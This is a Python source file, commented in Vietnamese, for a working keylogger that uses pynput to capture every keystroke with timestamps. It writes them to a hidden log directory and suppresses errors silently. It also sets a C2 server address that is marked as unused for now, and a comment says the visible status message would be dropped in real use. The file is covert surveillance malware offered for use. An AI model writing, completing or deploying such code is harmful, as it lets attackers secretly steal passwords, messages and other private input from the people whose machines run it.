import os
import datetime
from pynput import keyboard

# Cấu hình máy chủ C2 (tạm thời không dùng)
C2_HOST = '192.168.100.239'
C2_PORT = 12345

# Cấu hình thư mục và tệp log
LOG_DIR = ".__system_logs"
LOG_FILE_NAME = "key_log.log"
LOG_FILE_PATH = os.path.join(LOG_DIR, LOG_FILE_NAME)

# Biến toàn cục để theo dõi dấu thời gian của dòng log hiện tại
# Điều này giúp nhóm các phím bấm liên tục lại với nhau
last_log_time = None

def ensure_log_directory():
    """Đảm bảo thư mục log tồn tại một cách bí ẩn."""
    try:
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)
    except Exception as e:
        pass # Giữ im lặng

def on_press(key):
    """
    Hàm này được gọi mỗi khi có một phím được nhấn.
    Nó sẽ ghi lại phím đó vào tệp log với định dạng cải thiện.
    """
    global last_log_time
    ensure_log_directory()

    current_time = datetime.datetime.now()
    log_string = ""

    # Nếu đây là phím bấm đầu tiên hoặc đã có một khoảng dừng đáng kể (ví dụ: > 1 giây)
    # thì chúng ta sẽ bắt đầu một dòng log mới với dấu thời gian.
    if last_log_time is None or (current_time - last_log_time).total_seconds() > 1:
        log_string += f"\n[{current_time.strftime('%Y-%m-%d %H:%M:%S')}] " # Xuống dòng và thêm thời gian

    try:
        key_char = key.char
        if key_char is not None: # Đảm bảo đó là ký tự in được
            log_string += key_char
    except AttributeError:
        # Xử lý các phím đặc biệt
        if key == keyboard.Key.space:
            log_string += " "
        elif key == keyboard.Key.enter:
            log_string += "\n" # Thêm ký tự xuống dòng thực sự
        elif key == keyboard.Key.tab:
            log_string += "\t"
        elif key == keyboard.Key.backspace:
            # Đối với Backspace, có thể xóa ký tự cuối cùng nếu muốn,
            # nhưng đơn giản hơn là ghi dấu hiệu hoặc không làm gì.
            # Ở đây ta sẽ ghi dấu hiệu.
            log_string += "[BACKSPACE]"
        elif key == keyboard.Key.shift or \
             key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or \
             key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            # Bỏ qua các phím bổ trợ (modifier keys) như Shift, Ctrl, Alt
            # vì chúng thường không cần thiết trong log đầu ra.
            log_string = "" # Không thêm gì vào log_string cho các phím này
        else:
            # Đối với các phím đặc biệt khác, ghi tên phím
            log_string += f"[{str(key).replace('Key.', '').upper()}]" # Ví dụ: [CAPS_LOCK], [ESC]

    # Chỉ ghi vào tệp nếu có dữ liệu để ghi
    if log_string:
        try:
            with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
                f.write(log_string)
            last_log_time = current_time # Cập nhật thời gian log cuối cùng
        except Exception as e:
            pass # Giữ im lặng

# --- Phần chạy chính của Keylogger ---
if __name__ == "__main__":
    ensure_log_directory()

    print("Keylogger đang chạy ngầm. Nhấn Ctrl+C để dừng.") # Thêm dòng này để dễ dàng dừng khi thử nghiệm.
                                                         # Trong môi trường thực tế, bạn sẽ không có nó.
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

